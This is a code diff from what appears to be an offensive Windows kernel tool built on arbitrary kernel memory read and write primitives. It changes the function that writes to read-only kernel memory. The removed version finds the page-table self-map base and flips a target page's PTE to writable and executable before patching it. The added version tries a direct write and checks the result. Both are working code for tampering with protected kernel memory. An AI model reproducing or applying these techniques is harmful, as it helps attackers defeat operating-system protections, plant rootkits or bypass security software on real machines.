@@ -1539,92 +1539,29 @@ ULONG64 KM_GetDirectoryTableBase() {
     return dirBase;
 }
 
-static ULONG64 g_PteBase = 0;
-
-static BOOL IsCanonicalKernelAddr(ULONG64 addr) {
-    return (addr >> 48) == 0xFFFF;
-}
-
-static ULONG64 VaToPteAddr(ULONG64 pteBase, ULONG64 va) {
-    return pteBase + (((LONG64)va >> 9) & 0x7FFFFFFFF8ULL);
-}
-
-static ULONG64 FindPteBase() {
-    if (g_PteBase) return g_PteBase;
-
-    ULONG64 kernelBase = (ULONG64)g_KernelBase;
-
-    DbgLog("  FindPteBase: probing 256 PML4 indices (SAR formula)...");
-
-    for (int idx = 256; idx < 512; idx++) {
-        ULONG64 candidate = 0xFFFF000000000000ULL | ((ULONG64)idx << 39);
-        ULONG64 pteAddr = VaToPteAddr(candidate, kernelBase);
-
-        if (!IsCanonicalKernelAddr(pteAddr)) continue;
-
-        ULONG64 pte = 0;
-        if (!KM_ReadKernelMemory(pteAddr, &pte, sizeof(pte))) continue;
-
-        if ((pte & 1) && (pte & 0xFFFFFFFFFF000ULL)) {
-            ULONG64 pteAddr2 = VaToPteAddr(candidate, kernelBase + 0x1000);
-            ULONG64 pte2 = 0;
-            if (KM_ReadKernelMemory(pteAddr2, &pte2, sizeof(pte2)) &&
-                (pte2 & 1) && (pte2 & 0xFFFFFFFFFF000ULL)) {
-                g_PteBase = candidate;
-                DbgLog("  FindPteBase: found PTE_BASE=0x%llX (PML4 idx=%d)", candidate, idx);
-                DbgLog("  FindPteBase: PTE[KernelBase]=0x%llX at 0x%llX", pte, pteAddr);
-                DbgLog("  FindPteBase: PTE[KernelBase+0x1000]=0x%llX at 0x%llX", pte2, pteAddr2);
-                return g_PteBase;
-            }
-        }
-    }
-
-    DbgLog("  FindPteBase FAIL: no valid PML4 self-ref index found");
-    return 0;
-}
-
 BOOL KM_WriteToReadOnlyMemory(ULONG64 kernelAddr, PVOID buffer, SIZE_T size) {
     DbgLog("  WriteToReadOnly: VA=0x%llX, size=%llu", kernelAddr, (ULONG64)size);
+    DbgLog("  WriteToReadOnly: trying direct write (large page mapping may allow it)...");
 
-    ULONG64 pteBase = FindPteBase();
-    if (!pteBase) {
-        DbgLog("  WriteToReadOnly FAIL: cannot find PTE_BASE");
+    if (!KM_WriteKernelMemory(kernelAddr, buffer, size)) {
+        DbgLog("  WriteToReadOnly FAIL: direct write returned FALSE");
         return FALSE;
     }
 
-    ULONG64 pteAddr = VaToPteAddr(pteBase, kernelAddr);
-    DbgLog("  WriteToReadOnly: PTE at VA=0x%llX", pteAddr);
-
-    ULONG64 origPte = 0;
-    if (!KM_ReadKernelMemory(pteAddr, &origPte, sizeof(origPte))) {
-        DbgLog("  WriteToReadOnly FAIL: cannot read PTE");
-        return FALSE;
-    }
-    DbgLog("  WriteToReadOnly: original PTE=0x%llX", origPte);
-
-    if (!(origPte & 1)) {
-        DbgLog("  WriteToReadOnly FAIL: page not present");
+    BYTE verify = 0;
+    if (!KM_ReadKernelMemory(kernelAddr, &verify, 1)) {
+        DbgLog("  WriteToReadOnly FAIL: verify read failed");
         return FALSE;
     }
 
-    ULONG64 newPte = (origPte | 2) & ~((ULONG64)1 << 63);
-    DbgLog("  WriteToReadOnly: modified PTE=0x%llX (set RW, clear NX)", newPte);
-
-    if (!KM_WriteKernelMemory(pteAddr, &newPte, sizeof(newPte))) {
-        DbgLog("  WriteToReadOnly FAIL: cannot write modified PTE");
+    if (verify != ((BYTE*)buffer)[0]) {
+        DbgLog("  WriteToReadOnly FAIL: verify mismatch (wrote 0x%02X, read 0x%02X)",
+            ((BYTE*)buffer)[0], verify);
         return FALSE;
     }
 
-    SwitchToThread();
-
-    DbgLog("  WriteToReadOnly: writing %llu bytes to target...", (ULONG64)size);
-    BOOL ok = KM_WriteKernelMemory(kernelAddr, buffer, size);
-    DbgLog("  WriteToReadOnly: write result=%s", ok ? "OK" : "FAIL");
-
-    KM_WriteKernelMemory(pteAddr, &origPte, sizeof(origPte));
-    DbgLog("  WriteToReadOnly: PTE restored");
-
-    return ok;
+    DbgLog("  WriteToReadOnly: direct write succeeded and verified");
+    return TRUE;
 }
 
 PVOID KM_GetKernelExport(const char* name) {
